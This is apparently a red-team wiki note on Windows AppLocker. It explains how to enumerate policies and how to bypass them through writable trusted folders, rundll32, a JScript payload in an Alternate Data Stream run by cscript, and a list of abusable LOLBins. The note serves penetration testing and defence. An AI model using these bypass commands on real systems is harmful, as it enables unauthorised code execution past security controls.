---
title: Windows AppLocker
---

AppLocker is a security feature on [[notes/windows/index]], that controls which executables, DLLs and scripts an unprivileged user can execute.
Local service accounts are usually not affected.

Unlike [[notes/windows/wdac]], Microsoft does not consider AppLocker to be a security boundary.
The default policies are insecure and can be easily bypassed.

# Discovery

When you try to run an executable that is blocked by AppLocker you get the following error: *This program is blocked by group policy. For more information, contact your system administrator.*

Show AppLocker policies as unprivileged user.

=== "PowerShell"
    ~~~ powershell
    Get-ApplockerPolicy -Effective -Xml
    Get-ApplockerPolicy -Effective | Select -ExpandProperty RuleCollections
    Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'
    ~~~

Retrieve AppLocker policies from GPOs ([source](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/38565426-policy-enumeration)).

=== "[[notes/tools/powerview]] + [[notes/tools/gpregistrypolicyparser]]"
    ~~~ powershell
    Get-DomainGPO -Domain corp.local | ?{ $_.DisplayName -ilike '*AppLocker*' } | Select DisplayName,GPCFileSyspath
    cp \\dc01.corp.local\SysVol\corp.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol .
    Parse-PolFile .\Registry.pol
    ~~~

# Evasion

The default AppLocker policies do not apply to DLLs.
Therefore they can be easily bypassed, e.g. with `rundll32.exe`.

Furthermore executables under `C:\Program Files`, `C:\Program Files (x86)` and `C:\Windows` are allowed.
`C:\Windows` has multiple [[notes/windows/writable-directories|globally writable subdirectories]].
AppLocker can be bypassed when you have write permissions in at least one excluded directory.

Check for each writable directory if you have execution rights (`RX` or `F`).

=== "builtin"
    ~~~ bat
    icacls.exe C:\Windows\Tasks
    ~~~

Bypass AppLocker trough JScript in an *Alternate Data Stream*.

=== "cmd"
    ~~~ bat
    echo new ActiveXObject('WScript.Shell').Run('powershell.exe') > "C:\Program Files (x86)\App\Logfile.log:test.js"
    cscript.exe "C:\Program Files (x86)\App\Logfile.log:test.js"
    ~~~

More restrictive AppLocker policies can often be bypassed trough [LolBins](https://lolbas-project.github.io/) like:

~~~
C:\Windows\Microsoft.NET\Framework64\*\InstallUtil.exe
C:\Windows\Microsoft.NET\Framework64\*\MSBuild.exe
C:\Windows\Microsoft.NET\Framework64\*\Microsoft.Workflow.Compiler.exe
C:\Windows\Microsoft.NET\Framework64\*\RegAsm.exe
C:\Windows\Microsoft.NET\Framework64\*\RegSvcs.exe
C:\Windows\Microsoft.NET\Framework64\*\addinprocess.exe
C:\Windows\Microsoft.NET\Framework64\*\addinprocess32.exe
C:\Windows\Microsoft.NET\Framework64\*\aspnet_compiler.exe
C:\Windows\Microsoft.NET\Framework\*\InstallUtil.exe
C:\Windows\Microsoft.NET\Framework\*\MSBuild.exe
C:\Windows\Microsoft.NET\Framework\*\Microsoft.Workflow.Compiler.exe
C:\Windows\Microsoft.NET\Framework\*\RegAsm.exe
C:\Windows\Microsoft.NET\Framework\*\RegSvcs.exe
C:\Windows\Microsoft.NET\Framework\*\addinprocess.exe
C:\Windows\Microsoft.NET\Framework\*\addinprocess32.exe
C:\Windows\Microsoft.NET\Framework\*\aspnet_compiler.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\cmd.exe
C:\Windows\System32\cscript.exe
C:\Windows\System32\mshta.exe
C:\Windows\System32\regsvr32.exe
C:\Windows\System32\rundll32.exe
C:\Windows\System32\wscript.exe
~~~

If they are blocked search for abusable features in 3rd-party applications or installed scripting languages like Perl or Python.

References:

- [Windows 10/11: "Schein-Ordner" als Sicherheitsdesaster hebeln Applocker und SRP aus](http://web.archive.org/web/20230310190607/https://www.borncity.com/blog/2023/03/09/windows-10-11-schein-ordner-als-sicherheitsdesaster-hebeln-applocker-und-srp-aus/), AppLocker bypass by combining *Mocked* with *Trusted Folders*
- [Arbitrary, Unsigned Code Execution Vector in Microsoft.Workflow.Compiler.exe](https://scribe.rip/@specterops/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb)
- [Microsoft recommended block rules](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules), list of dangerous programs that can be used for bypasses
- [Ultimate AppLocker bypass list](https://github.com/api0cradle/ultimateapplockerbypasslist)
